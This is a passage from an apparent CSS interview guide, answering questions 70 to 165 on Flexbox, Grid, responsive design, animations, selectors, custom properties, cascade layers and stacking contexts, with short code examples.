  align-items: center;
  gap: 8px;
}
```

### 70: What are the main axis and the cross axis in Flexbox?

The **main axis** is the direction set by `flex-direction`: horizontal for `row`, vertical for `column`. The **cross axis** is the other direction.

`justify-content` aligns items along the main axis, and `align-items` aligns them along the cross axis. When you switch to `flex-direction: column`, the two swap roles.

### 71: What does `flex-direction` do?

It sets the direction of the main axis:

- `row` (default): left to right in left-to-right languages.
- `row-reverse`: right to left.
- `column`: top to bottom.
- `column-reverse`: bottom to top.

The reverse values only change the visual order. Keyboard tab order and screen readers still follow the HTML order.

### 72: What does `justify-content` do?

It spreads items along the main axis.

```css
.nav {
  display: flex;
  justify-content: space-between;
}
```

Values: `flex-start`, `flex-end`, `center`, `space-between` (no space at the ends), `space-around` (half-size space at the ends) and `space-evenly` (equal space everywhere).

### 73: What does `align-items` do?

It aligns items on the cross axis.

- `stretch` (default): items fill the container's cross size.
- `flex-start` / `flex-end` / `center`.
- `baseline`: lines up the first line of text in each item.

### 74: What does `flex-wrap` do?

By default (`nowrap`), flex items stay on one line and shrink to fit. `flex-wrap: wrap` lets them move to new lines when there isn't enough room.

```css
.tags {
  display: flex;
  flex-wrap: wrap;
  gap: 0.5rem;
}
```

`flex-flow` is a shorthand for `flex-direction` and `flex-wrap`: `flex-flow: row wrap;`.

### 75: What does the `gap` property do?

`gap` adds space between flex items, grid tracks or multi-column columns, but not around the outside edges. It replaced the old trick of putting margins on children and cancelling them with negative margins.

```css
.grid {
  display: grid;
  gap: 1rem 2rem; /* row-gap column-gap */
}
```

### 76: What does `flex: 1` mean?

`flex` is a shorthand for `flex-grow`, `flex-shrink` and `flex-basis`. `flex: 1` means `flex: 1 1 0%`: the item can grow and shrink, and it starts from a size of zero. So all items with `flex: 1` end up the same size.

```css
.sidebar {
  flex: 0 0 250px;
} /* fixed 250px, no growing or shrinking */
.content {
  flex: 1;
} /* takes the rest */
```

Other common values: `flex: auto` is `1 1 auto` and `flex: none` is `0 0 auto`.

### 77: What does the `order` property do?

It changes the visual order of flex or grid items. Items with lower values come first, and the default is 0.

```css
.featured {
  order: -1;
} /* moves to the front */
```

It only changes what you see, not the tab order or what screen readers read. Use it carefully, or keyboard users will jump around the page in a confusing way.

### 78: What does `align-self` do?

It overrides `align-items` for one item.

```css
.container {
  display: flex;
  align-items: flex-start;
}
.special {
  align-self: center;
}
```

### 79: How do you center an element both ways with Flexbox?

```css
.parent {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}
```

Another option is `margin: auto` on the child, which also centers it inside a flex container.

### 80: What is CSS Grid?

Grid (`display: grid`) is a two-dimensional layout system. You define rows and columns, then place items into them. Flexbox works in one direction at a time, while grid controls both directions together.

```css
.page {
  display: grid;
  grid-template-columns: 200px 1fr;
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
}
```

### 81: What is the `fr` unit?

`fr` means a fraction of the free space in the grid container. Free space is what's left after fixed tracks and gaps are taken out.

```css
.grid {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr; /* the middle column is twice as wide */
}
```

### 82: What does `repeat()` do in grid?

It saves you from writing the same track size many times.

```css
grid-template-columns: repeat(4, 1fr);
grid-template-columns: repeat(2, 100px 1fr); /* 100px 1fr 100px 1fr */
grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
```

The last line is a responsive grid with no media queries. It fits as many 200px-or-wider columns as it can.

### 83: How do you make a grid item span several columns or rows?

Use `grid-column` and `grid-row` with line numbers or `span`.

```css
.hero {
  grid-column: 1 / -1;
} /* from the first line to the last line */
.wide {
  grid-column: span 2;
} /* two columns wide */
.tall {
  grid-row: 2 / 4;
} /* from row line 2 to row line 4 */
```

Negative numbers count from the end, but only for lines of the explicit grid.

### 84: What is `grid-template-areas`?

It lets you name areas of the grid and draw the layout with text.

```css
.page {
  display: grid;
  grid-template-columns: 200px 1fr;
  grid-template-areas:
    "header header"
    "sidebar main"
    "footer footer";
}
.header {
  grid-area: header;
}
.sidebar {
  grid-area: sidebar;
}
.main {
  grid-area: main;
}
.footer {
  grid-area: footer;
}
```

Each area has to be a rectangle. A `.` marks an empty cell.

### 85: When should you use Flexbox and when should you use Grid?

- **Flexbox**: one-direction layouts where the content decides the sizes. Examples are navbars, toolbars, button groups and centering one thing.
- **Grid**: two-direction layouts where you want rows and columns to line up. Examples are page layouts, card grids and forms.

They work well together. It's common to use grid for the page and flexbox inside each component.

### 86: What is the shortest way to center something with Grid?

```css
.parent {
  display: grid;
  place-items: center;
}
```

`place-items` is a shorthand for `align-items` and `justify-items`.

### 87: What are media queries?

Media queries apply styles only when a condition is true, usually about the viewport size or a user setting.

```css
.grid {
  grid-template-columns: 1fr;
}

@media (min-width: 768px) {
  .grid {
    grid-template-columns: repeat(2, 1fr);
  }
}

@media (width >= 1024px) {
  /* newer range syntax */
  .grid {
    grid-template-columns: repeat(3, 1fr);
  }
}
```

### 88: What is mobile-first CSS?

You write the base styles for small screens first, then add `min-width` media queries for bigger screens. Small screens get the simplest CSS, and you build up from there. This is usually easier than starting with the desktop layout and undoing it for mobile with `max-width` queries.

### 89: Why do you need the viewport meta tag?

Without it, mobile browsers pretend the screen is about 980px wide and zoom the page out, and your media queries don't fire as you'd expect.

```html
<meta name="viewport" content="width=device-width, initial-scale=1" />
```

This tag is HTML, but responsive CSS doesn't work properly on phones without it.

### 90: How do you make images responsive with CSS?

```css
img {
  max-width: 100%;
  height: auto;
  display: block;
}
```

`max-width: 100%` stops images from growing wider than their container, and `height: auto` keeps the aspect ratio. `display: block` removes the small gap under inline images.

### 91: What is a CSS transition?

A transition animates a property smoothly from one value to another when the value changes, for example on hover.

```css
.button {
  background: royalblue;
  transition: background-color 200ms ease;
}
.button:hover {
  background: darkblue;
}
```

### 92: What are the parts of the `transition` shorthand?

`transition: property duration timing-function delay;`

```css
.card {
  transition:
    transform 300ms ease-out,
    box-shadow 300ms ease-out 50ms;
}
```

Timing functions include `ease` (default), `linear`, `ease-in`, `ease-out`, `ease-in-out`, `cubic-bezier()`, `steps()` and `linear()`. Avoid `transition: all`. It can animate things you didn't mean to and costs more.

### 93: What does `transform` do?

It moves, rotates, scales or skews an element visually without affecting the layout around it.

```css
.a {
  transform: translate(10px, 20px);
}
.b {
  transform: rotate(45deg);
}
.c {
  transform: scale(1.1);
}
.d {
  transform: translateX(-50%) rotate(10deg);
}
```

There are also separate properties for each one: `translate`, `rotate` and `scale`.

### 94: How do you create a CSS animation?

Define the steps with `@keyframes`, then apply them with `animation`.

```css
@keyframes fade-in {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.toast {
  animation: fade-in 300ms ease-out;
}
```

You can use percentages for more steps: `0%`, `50%`, `100%`.

### 95: What are the animation properties?

```css
.spinner {
  animation-name: spin;
  animation-duration: 1s;
  animation-timing-function: linear;
  animation-delay: 0s;
  animation-iteration-count: infinite;
  animation-direction: normal; /* reverse, alternate, alternate-reverse */
  animation-fill-mode: none; /* forwards, backwards, both */
  animation-play-state: running; /* paused */
}

/* shorthand */
.spinner {
  animation: spin 1s linear infinite;
}
```

### 96: What is the difference between `:hover`, `:focus` and `:active`?

- `:hover`: the pointer is over the element.
- `:focus`: the element has keyboard focus, or was clicked if it's focusable.
- `:active`: the element is being pressed (mouse button held down).

On touch screens `:hover` acts strangely, so don't hide important content behind it.

### 97: What is `:focus-visible`?

`:focus-visible` matches when the browser decides a focus ring should be shown. That's usually when the user is using the keyboard, not when they click with a mouse. You get clear focus styles for keyboard users without rings showing on every mouse click.

```css
button:focus-visible {
  outline: 3px solid orange;
  outline-offset: 2px;
}
```

### 98: How do `:first-child`, `:last-child` and `:nth-child()` work?

```css
li:first-child {
  font-weight: bold;
}
li:last-child {
  border-bottom: none;
}
li:nth-child(2) {
  color: red;
} /* the 2nd one */
tr:nth-child(odd) {
  background: #f5f5f5;
} /* 1st, 3rd, 5th... */
li:nth-child(3n) {
  color: blue;
} /* every 3rd one */
li:nth-child(n + 4) {
  opacity: 0.5;
} /* 4th and after */
li:nth-last-child(-n + 2) {
  color: gray;
} /* the last two */
```

They count from 1, not 0. They count all sibling elements, whatever their type.

### 99: What is the difference between `:nth-child()` and `:nth-of-type()`?

`:nth-child()` counts all sibling elements. `:nth-of-type()` only counts siblings with the same tag.

```html
<div>
  <h2>Title</h2>
  <p>First</p>
  <p>Second</p>
</div>
```

`p:nth-child(1)` matches nothing, because the first child is the `h2`. `p:nth-of-type(1)` matches "First".

### 100: What does `:not()` do?

It matches elements that don't match the selector inside it. It accepts a list of selectors.

```css
li:not(:last-child) {
  border-bottom: 1px solid #ddd;
}
button:not(.primary, .danger) {
  background: gray;
}
```

Its specificity is the specificity of the most specific selector inside it.

### 101: How do `::before` and `::after` work?

They add a pseudo-element as the first or last child of an element. They only appear if you set `content`, even if it's empty.

```css
.quote::before {
  content: "\201C"; /* left double quote */
  font-size: 2em;
}
.link-external::after {
  content: "";
  display: inline-block;
  width: 0.8em;
  height: 0.8em;
  background: url("external.svg") no-repeat center / contain;
}
```

They don't work on replaced elements like `<img>` and `<input>`, because those can't have children.

### 102: What do `::placeholder` and `::selection` do?

- `::placeholder` styles the placeholder text in an input.
- `::selection` styles the text the user has highlighted.

```css
input::placeholder {
  color: #999;
}
::selection {
  background: #ffe066;
  color: #000;
}
```

`::selection` only supports a few properties, such as `color`, `background-color`, `text-decoration` and `text-shadow`.

### 103: What are `::first-letter` and `::first-line`?

They style the first letter or the first rendered line of a block of text. They're used for drop caps and lead-in styles.

```css
article p:first-of-type::first-letter {
  float: left;
  font-size: 3em;
  line-height: 1;
  margin-right: 0.1em;
}
```

The `initial-letter` property is made for drop caps, but browser support is still uneven.

### 104: What are CSS custom properties?

Custom properties (often called CSS variables) are values you define once and reuse. Their names start with `--`, and you read them with `var()`.

```css
:root {
  --brand: #4f46e5;
  --radius: 8px;
}
.button {
  background: var(--brand);
  border-radius: var(--radius);
}
```

Unlike Sass variables, they exist while the page runs. They inherit, they can be changed in media queries or by JavaScript, and they follow the cascade.

### 105: How do you give `var()` a fallback value?

Put it after a comma:

```css
.card {
  padding: var(--card-padding, 1rem);
  color: var(--text, var(--fallback-text, black));
}
```

The fallback is used when the variable isn't defined. It isn't used when the variable is defined with a value that's wrong for the property.

### 106: What does `calc()` do?

`calc()` does math with values, and it can mix units.

```css
.sidebar {
  width: calc(100% - 250px);
}
.title {
  font-size: calc(1rem + 1vw);
}
.item {
  margin: calc(var(--space) * 2);
}
```

You need spaces around `+` and `-`. `calc(100%-10px)` is invalid.

### 107: What are `min()`, `max()` and `clamp()`?

- `min(a, b)` uses the smaller value.
- `max(a, b)` uses the larger value.
- `clamp(min, preferred, max)` uses the preferred value but keeps it between the two limits.

```css
.container {
  width: min(100% - 2rem, 1200px);
}
h1 {
  font-size: clamp(1.75rem, 4vw + 1rem, 3rem);
}
.button {
  padding-inline: max(1rem, 2vw);
}
```

You can do math inside them without writing `calc()`.

### 108: How do you write comments in CSS?

Only with `/* ... */`. They can span several lines. `//` is not a comment in plain CSS (it is in Sass and Less), and using it can break the next rule.

```css
/* Main navigation */
.nav {
  display: flex;
}
```

### 109: What is the difference between a CSS reset and Normalize.css?

- A **reset** (like the old Eric Meyer reset) removes most browser default styles, such as margins, heading sizes and list bullets, so you start from almost nothing.
- **Normalize.css** keeps useful defaults and only fixes the differences between browsers.

Many projects today use a small "modern reset" that does a bit of both: sets `box-sizing`, removes default margins, makes images block-level, and makes form controls inherit fonts.

### 110: What is the user agent stylesheet?

It's the browser's built-in default CSS. It's why `h1` is big and bold, `ul` has bullets and padding, and `body` has an 8px margin. Your styles override it because author styles come later in the cascade. You can see these defaults in DevTools, marked as "user agent stylesheet".

### 111: How do you style lists?

```css
ul.clean {
  list-style: none;
  margin: 0;
  padding: 0;
}
ol.roman {
  list-style-type: upper-roman;
}
ul.check {
  list-style-image: url("check.svg");
}
li::marker {
  color: tomato;
}
```

Safari doesn't announce lists to VoiceOver as lists when you remove `list-style`. If that matters, add `role="list"` to the `ul`.

### 112: In what order should you write link states?

Use the "LoVe HAte" order: `:link`, `:visited`, `:hover`, `:active`. These selectors all have the same specificity, so the later one wins. If `:hover` came before `:visited`, visited links wouldn't change on hover.

```css
a:link {
  color: blue;
}
a:visited {
  color: purple;
}
a:hover {
  color: darkblue;
}
a:active {
  color: red;
}
```

Add `:focus-visible` next to `:hover` for keyboard users.

### 113: What does the `cursor` property do?

It changes the mouse pointer shown over an element.

```css
button {
  cursor: pointer;
}
.disabled {
  cursor: not-allowed;
}
.draggable {
  cursor: grab;
}
.resizer {
  cursor: col-resize;
}
```

### 114: What does `object-fit` do?

It controls how an `<img>` or `<video>` fills its box when the box has a different shape from the media.

```css
.thumb {
  width: 200px;
  height: 200px;
  object-fit: cover; /* fill and crop */
  object-position: top center; /* which part to keep */
}
```

The values are `fill` (default, stretches), `contain`, `cover`, `none` and `scale-down`.

### 115: What does `aspect-ratio` do?

It keeps an element at a set width-to-height ratio.

```css
.video {
  width: 100%;
  aspect-ratio: 16 / 9;
}
.square {
  aspect-ratio: 1;
}
```

Before this property existed, people used the "padding-top: 56.25%" hack. Browsers also use the `width` and `height` attributes on `<img>` to set an aspect ratio before the image loads, which stops layout from jumping.

### 116: What does `vertical-align` do?

It aligns inline, inline-block and table-cell elements vertically. It does nothing on block elements or flex items.

```css
img.icon {
  vertical-align: middle;
}
td {
  vertical-align: top;
}
```

Common values: `baseline` (default), `middle`, `top`, `bottom`, `text-top`, `text-bottom`, or a length.

### 117: What does `pointer-events: none` do?

The element stops reacting to the mouse and touch. Clicks go through it to whatever is underneath. It's useful for decorative overlays.

```css
.overlay-decoration {
  pointer-events: none;
}
```

It doesn't stop keyboard focus. A button with `pointer-events: none` can still be reached with Tab and pressed with Enter. To really disable something, use the `disabled` attribute or `inert`.

### 118: What does `display: inline-flex` do?

The element is a flex container for its children, but on the outside it acts like an inline element and sits in a line of text. It's common for buttons with an icon and a label.

```css
.button {
  display: inline-flex;
  align-items: center;
  gap: 0.5em;
}
```

`inline-grid` works the same way for grid.

### 119: How do you style tables?

```css
table {
  border-collapse: collapse; /* single borders between cells */
  width: 100%;
}
th,
td {
  border: 1px solid #ddd;
  padding: 0.5rem 0.75rem;
  text-align: left;
}
tbody tr:nth-child(even) {
  background: #f9f9f9;
}
caption {
  caption-side: bottom;
}
```

With `border-collapse: separate` (the default), each cell has its own borders, and `border-spacing` sets the gap between them.

### 120: Why does `opacity` on a parent affect its children?

`opacity` applies to the element after it has been drawn, together with everything inside it. A child can't be less transparent than its parent, even with `opacity: 1`. If you only want a see-through background, use an alpha color on the background.

### 121: What is a CSS preprocessor?

A preprocessor is a language that compiles to CSS and adds features plain CSS used to lack. Sass (SCSS syntax) is the most used one, and Less is the other well-known one. Common features: variables, nesting, mixins, functions, loops and splitting code into partial files.

Native CSS now has custom properties, nesting and math functions, so many projects need a preprocessor less than before. Sass is still common in existing codebases.

### 122: What are vendor prefixes?

Vendor prefixes like `-webkit-`, `-moz-` and `-ms-` were how browsers shipped experimental features before they were finished.

```css
.text {
  -webkit-background-clip: text;
  background-clip: text;
}
```

Browsers now ship new features behind flags instead. You rarely write prefixes by hand. A tool like Autoprefixer (a PostCSS plugin) adds them based on the browsers you support.

### 123: What is PostCSS?

PostCSS is a tool that runs CSS through JavaScript plugins. Common plugins:

- **Autoprefixer**: adds vendor prefixes.
- **postcss-preset-env**: turns newer CSS syntax into code older browsers understand.
- **cssnano**: minifies CSS.

Many frameworks and build tools (Vite, Next.js, Tailwind) use PostCSS or a similar tool such as Lightning CSS.

### 124: What is a CSS framework?

A CSS framework is a ready-made set of styles and components. Examples:

- **Bootstrap**: prebuilt components like buttons, navbars and modals.
- **Tailwind CSS**: small utility classes that you combine in your HTML.
- **Bulma**, **Foundation**: other component frameworks.

They speed up development and keep things consistent, but you add their size and their opinions to your project.

### 125: Why should you avoid `@import` in plain CSS?

`@import` inside a CSS file makes the browser download that file, find the import, and only then start downloading the imported file. Each level adds another round trip, and CSS blocks rendering, so the page appears later.

Use several `<link>` tags, or let a bundler join the files at build time. `@import` is fine when a build tool processes it, and `@import ... layer()` is useful for cascade layers.

### 126: What is the difference between `<link>` and `@import`?

`<link>` lives in the HTML, and the browser can find it and start downloading it right away, in parallel with other files. `@import` lives inside a CSS file, so the browser only finds it after downloading and parsing that file. `@import` rules must also come before all other rules, apart from `@charset` and `@layer` statements.

### 127: What is a common mistake with shorthand properties?

A shorthand resets every sub-property you leave out back to its initial value.

```css
.box {
  background-color: red;
  background: url("bg.png"); /* background-color is reset to transparent */
}
```

The same happens with `font`, `border`, `margin`, `animation` and others. If you only want to change one part, use the longhand property, like `background-image`.

### 128: What is the "62.5%" trick, and should you use it?

Setting `html { font-size: 62.5%; }` makes `1rem` equal 10px, which makes the math easy (`1.6rem` = 16px). The downside is that every component must set its font size again, and third-party components may come out tiny. Many teams now leave the root at 100% and just do the math, or use a design token scale. Never set the root size in `px`. That ignores the user's browser font setting.

### 129: What does the `inset` property do?

`inset` is a shorthand for `top`, `right`, `bottom` and `left`. It uses the same 1-4 value pattern as margin.

```css
.overlay {
  position: absolute;
  inset: 0; /* fills the positioned parent */
}
```

### 130: What are logical properties?

Logical properties describe sides by text direction instead of by screen direction. They switch automatically for right-to-left languages and vertical writing.

| Physical                       | Logical                                     |
| ------------------------------ | ------------------------------------------- |
| `margin-left` / `margin-right` | `margin-inline-start` / `margin-inline-end` |
| `margin-top` / `margin-bottom` | `margin-block-start` / `margin-block-end`   |
| `width` / `height`             | `inline-size` / `block-size`                |
| `text-align: left`             | `text-align: start`                         |

```css
.card {
  padding-inline: 1rem;
  margin-block: 2rem;
}
```

### 131: How do you detect dark mode in CSS?

Use the `prefers-color-scheme` media feature.

```css
:root {
  --bg: white;
  --text: #111;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg: #111;
    --text: #eee;
  }
}
body {
  background: var(--bg);
  color: var(--text);
}
```

Also set `color-scheme: light dark;` on `:root`, so scrollbars and form controls switch too.

### 132: What is `prefers-reduced-motion`?

It's a media feature that tells you the user asked the OS for less motion. Motion can make some people dizzy or sick.

```css
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

Reducing motion doesn't mean removing every effect. A fade is usually fine. Big slides, zooms and parallax are what cause problems.

### 133: How do you write print styles?

Use `@media print`, or a stylesheet with `media="print"`.

```css
@media print {
  nav,
  .ads,
  button {
    display: none;
  }
  body {
    color: black;
    background: white;
  }
  a[href]::after {
    content: " (" attr(href) ")";
  }
  h2 {
    break-after: avoid;
  }
}
```

You can test it in DevTools by emulating print media in the Rendering panel.

### 134: What is a CSS sprite?

A sprite is one image file that holds many small icons. Each icon is shown with `background-position`. It was used to cut down HTTP requests in the HTTP/1.1 days.

```css
.icon {
  background: url("sprite.png") no-repeat;
  width: 16px;
  height: 16px;
}
.icon-home {
  background-position: 0 0;
}
.icon-user {
  background-position: -16px 0;
}
```

Today it's mostly legacy. People use inline SVG, SVG sprites with `<use>`, or icon components, and HTTP/2 makes many small requests cheap.

### 135: What does the `resize` property do?

It lets the user resize an element by dragging its corner. It only works when `overflow` is not `visible`.

```css
textarea {
  resize: vertical;
} /* none, both, horizontal, vertical */
.panel {
  overflow: auto;
  resize: both;
}
```

### 136: What does `scroll-behavior: smooth` do?

It makes the page scroll smoothly instead of jumping when you click an anchor link or call `scrollTo()` from JavaScript.

```css
html {
  scroll-behavior: smooth;
}

@media (prefers-reduced-motion: reduce) {
  html {
    scroll-behavior: auto;
  }
}
```

### 137: What does `accent-color` do?

It sets the main color of built-in form controls like checkboxes, radio buttons, range sliders and progress bars, with no custom markup.

```css
:root {
  accent-color: #4f46e5;
}
```

The browser picks a check mark color that has enough contrast with your accent.

### 138: Which pseudo-classes help style form states?

```css
input:checked + label {
  font-weight: bold;
}
input:disabled {
  opacity: 0.5;
}
input:enabled {
  background: white;
}
input:required {
  border-left: 3px solid orange;
}
input:optional {
  border-left: none;
}
input:read-only {
  background: #f3f3f3;
}
input:indeterminate {
  outline: 2px dashed gray;
}
```

`:indeterminate` matches a checkbox whose `indeterminate` property was set by JavaScript. It also matches a radio group with nothing selected.

### 139: What is the difference between `:invalid` and `:user-invalid`?

`:invalid` matches as soon as the field fails validation, even before the user types anything, so a required field shows red on page load. `:user-invalid` only matches after the user has interacted with the field (or tried to submit the form), which is what you usually want.

```css
input:user-invalid {
  border-color: crimson;
}
input:user-valid {
  border-color: seagreen;
}
```

### 140: What is `::marker`?

It styles the bullet or number of a list item, and also the triangle on a `<summary>`.

```css
li::marker {
  color: #4f46e5;
  font-weight: bold;
}
ol li::marker {
  content: counter(list-item) ") ";
}
```

Only a few properties work on it, like `color`, `content` and font properties.

### 141: What does the `filter` property do?

It applies image effects to an element and everything inside it.

```css
img.gray {
  filter: grayscale(100%);
}
.blurred {
  filter: blur(4px);
}
.icon:hover {
  filter: brightness(1.2) drop-shadow(0 2px 4px rgb(0 0 0 / 30%));
}
```

Other functions: `contrast()`, `saturate()`, `sepia()`, `invert()`, `hue-rotate()` and `opacity()`. Any filter other than `none` creates a stacking context.

### 142: What does `backdrop-filter` do?

It applies filters to whatever is behind the element. It's used for the "frosted glass" look. The element needs a background that is at least partly transparent, or you won't see anything behind it.

```css
.glass {
  background: rgb(255 255 255 / 30%);
  backdrop-filter: blur(12px);
}
```

It can be slow on large areas or weak devices.

### 143: What is the difference between `overflow-wrap` and `word-break`?

- `overflow-wrap: break-word` (old name `word-wrap`) breaks a long word only when it wouldn't fit on a line by itself.
- `overflow-wrap: anywhere` is the same, but the possible breaks also count when the browser works out min-content size. It helps inside flex items and tables.
- `word-break: break-all` breaks between any two characters, even when the word would fit on the next line.

For long URLs or ids in user content, `overflow-wrap: anywhere` is usually the right choice.

### 144: What does `text-wrap: balance` do?

It makes the browser spread text evenly across lines, so a heading doesn't end with one lonely word on the last line.

```css
h1,
h2,
h3 {
  text-wrap: balance;
}
p {
  text-wrap: pretty;
}
```

`balance` only works on short blocks (a few lines), because it's costly. `pretty` mainly avoids a single word on the last line of a paragraph. Browsers that don't support these values just ignore them.

### 145: How do you limit text to a set number of lines?

```css
.excerpt {
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 3;
  overflow: hidden;
}
```

The prefixed version is the one that works everywhere today. The spec also defines an unprefixed `line-clamp` property, but support for it is still incomplete, so keep the prefixed form.

### 146: Why doesn't `height: 100%` work?

A percentage height only works if the parent has a defined height. If the parent's height is `auto` (decided by its content), the percentage can't be worked out and acts like `auto`. You'd have to set heights all the way up to `html` and `body`.

Better options are viewport units (`min-height: 100dvh`), flexbox or grid with stretching, or `height: 100%` inside a grid or flex item that already has a definite size.

### 147: What does `display: contents` do?

It makes the element's own box disappear, and its children act as if they were children of its parent. It's useful when a wrapper element gets in the way of a flex or grid layout.

```css
.wrapper {
  display: contents;
}
```

Old browser versions had bugs where `display: contents` removed the element's meaning for screen readers, for example on buttons and lists. Most of these are fixed, but don't use it on interactive elements.

### 148: How do you debug CSS in the browser?

Open DevTools (F12) and use the **Elements** panel:

- **Styles** tab: every rule that matches, overridden declarations crossed out, and you can edit values live.
- **Computed** tab: the final value of each property and which rule set it.
- Box model diagram: margin, border, padding and content sizes.
- Flex and grid badges that draw overlays on the layout.
- `:hov` button to force `:hover`, `:focus` and other states.

### 149: What happens when a browser sees CSS it doesn't understand?

It ignores that declaration or rule and carries on. That's what makes fallbacks work:

```css
.box {
  height: 100vh; /* old browsers use this */
  height: 100dvh; /* new browsers override it */
}
```

If one selector in a normal selector list is invalid, the whole rule is dropped. If a syntax error isn't closed properly, like a missing `}`, it can break the rules that come after it.

### 150: How do you check if a CSS feature is safe to use?

- **MDN**: every property page has a browser compatibility table.
- **caniuse.com**: support tables and usage numbers.
- **Baseline**: a label on MDN and web.dev. "Newly available" means it works in all major browsers. "Widely available" means it has worked everywhere for at least 30 months.

For features that aren't Baseline yet, use `@supports` or make sure the page still works without them.

## Moderate Questions (151-300)

### 151: How does specificity work for `:is()`, `:where()`, `:not()` and `:has()`?

- `:is()`, `:not()` and `:has()` take the specificity of the most specific selector inside them.
- `:where()` always has zero specificity, whatever is inside it.

```css
:is(#main, .content) p {
} /* (1,0,1): the #main counts even when .content matched */
:where(#main, .content) p {
} /* (0,0,1) */
```

The first case surprises people. Having one id in the list makes the whole `:is()` as strong as an id, even for elements that only matched the class.

### 152: When would you use `:where()` instead of `:is()`?

Use `:where()` when you want styles that are easy to override, like resets, base styles and library defaults. Any single class can beat them.

```css
:where(ul, ol)[role="list"] {
  list-style: none;
  padding: 0;
}
:where(.btn) {
  padding: 0.5rem 1rem;
}
```

Use `:is()` when you just want shorter selectors and normal specificity:

```css
:is(h1, h2, h3):hover {
  color: navy;
}
```

### 153: What is `:has()` and what can you do with it?

`:has()` matches an element if it contains something that matches the selector inside it. People call it the "parent selector", but it can also look at following siblings.

```css
/* card that contains an image */
.card:has(img) {
  grid-template-rows: 200px 1fr;
}

/* label before an invalid input */
label:has(+ input:user-invalid) {
  color: crimson;
}

/* form with a checked checkbox */
form:has(input[name="agree"]:checked) button {
  opacity: 1;
}

/* lock page scroll while a modal is open */
html:has(dialog[open]) {
  overflow: hidden;
}
```

It's Baseline since late 2023. A lot of things that used to need JavaScript to toggle classes can now be done with it.

### 154: How does native CSS nesting work?

You can write rules inside other rules, like in Sass.

```css
.card {
  padding: 1rem;

  & h2 {
    font-size: 1.25rem;
  }
  .meta {
    color: gray;
  } /* & is optional before a class */
  &:hover {
    box-shadow: 0 4px 12px rgb(0 0 0 / 10%);
  }
  &.featured {
    border-color: gold;
  }

  @media (width >= 768px) {
    padding: 2rem;
  }
}
```

`&` stands for the parent selector. You need it when you're attaching something directly to the parent, like `&:hover` or `&.featured`.

### 155: How is native nesting different from Sass nesting?

1. **No string joining.** Sass lets you write `&__title` to make `.card__title`. Native CSS doesn't. `&__title` doesn't work.
2. **Specificity.** Native nesting works like wrapping the parent in `:is()`. So `.a, #b { & .c {} }` becomes `:is(.a, #b) .c`, which has id-level specificity even for `.a .c`.
3. **It runs in the browser.** Nothing is compiled, so the rules stay nested in the CSSOM.

Early versions of the spec required `&` or a symbol before type selectors (`& h2`). Current browsers accept `h2` alone.

### 156: What are cascade layers (`@layer`)?

Cascade layers let you group styles into named layers and decide which layers win. Layer order beats specificity: a simple selector in a later layer wins over a very specific selector in an earlier one.

```css
@layer reset, base, components, utilities;

@layer reset {
  * {
    margin: 0;
  }
}
@layer components {
  #sidebar .nav a {
    color: gray;
  } /* high specificity */
}
@layer utilities {
  .text-red {
    color: red;
  } /* still wins, because the layer is later */
}
```

### 157: How do layer order and unlayered styles work?

- Layers are ordered by when their names first appear. The usual practice is to list all of them at the top with one `@layer a, b, c;` statement.
- Styles that aren't in any layer go into an implicit last layer, so they **beat all named layers**.
- Nested layers are written with dots: `@layer framework.base`.

That's why you often put third-party CSS in a layer. Then your unlayered styles override it with no specificity battles.

### 158: How does `!important` behave inside cascade layers?

It flips. For normal declarations, later layers win. For `!important` declarations, **earlier layers win**, and important declarations in layers beat important unlayered ones.

This lets a reset layer at the start mark something as `!important`, and nothing later can override it by accident. It's surprising, so most teams avoid `!important` inside layers.

### 159: How do you put third-party CSS into a cascade layer?

Use `@import` with `layer()`:

```css
@layer vendor, base, components;

@import url("bootstrap.min.css") layer(vendor);
@import url("theme.css") layer(base) supports(display: grid) screen;
```

In HTML there's no `layer` attribute on `<link>` yet, so people use `@import` in a CSS file, or a bundler that wraps the file in `@layer vendor { ... }`.

### 160: What is the full order of the cascade?

From the highest priority to the lowest:

1. Transitions (while running).
2. `!important` from the browser (user agent).
3. `!important` from the user.
4. `!important` from the author (the page). Inside this, earlier layers beat later layers, and inline `!important` beats both.
5. Animations (`@keyframes`).
6. Normal author styles. Inline styles, then unlayered, then later layers before earlier layers. After that, specificity, then source order.
7. Normal user styles.
8. Normal browser styles.

`@scope` proximity sits between specificity and source order.

### 161: What is a stacking context, and what creates one?

A stacking context is a group of elements that get layered together. `z-index` values inside it only compete with each other. Then the whole group is placed as one unit inside its parent's context.

Things that create one:

- The root element.
- `position: absolute` or `relative` with a `z-index` other than `auto`.
- `position: fixed` or `sticky`.
- A flex or grid item with a `z-index` other than `auto`.
- `opacity` below 1.
- `transform`, `filter`, `backdrop-filter`, `perspective`, `clip-path`, `mask` (any value other than `none`).
- `isolation: isolate`.
- `mix-blend-mode` other than `normal`.
- `will-change` naming any of the above.
- `contain: layout` or `paint`, and `container-type: size` or `inline-size`.
- Elements in the top layer (open modal dialogs, popovers).

### 162: A dropdown shows up behind another section even with `z-index: 9999`. How do you fix it?

The dropdown is probably inside a parent that creates a stacking context, and that parent sits below the other section.

1. In DevTools, walk up from the dropdown and look for ancestors with `transform`, `opacity`, `filter`, `z-index` + `position`, and so on.
2. Raise the `z-index` of that ancestor in its own context, or remove the property that creates the context if you don't need it.
3. Or render the dropdown outside that tree. Today the best fix is often the `popover` attribute, which puts the element in the top layer, above everything, with no `z-index` needed.

### 163: What is a block formatting context (BFC)?

A BFC is an area where block boxes are laid out on their own, separate from the outside. Inside a BFC:

- Floats are contained, so the parent wraps around its floated children.
- Margins of children don't collapse with margins outside the BFC.
- The BFC box doesn't overlap floats next to it.

### 164: How do you create a block formatting context?

The cleanest way is `display: flow-root`. It exists only for this purpose and has no side effects. Other things that create a BFC: `overflow` other than `visible` or `clip`, `float`, `position: absolute` or `fixed`, `display: inline-block`, flex and grid items, table cells, `contain: layout` and multi-column containers.

```css
.media {
  display: flow-root;
} /* contains floated image, no clearfix */
```

### 165: What is the containing block of an absolutely positioned element?

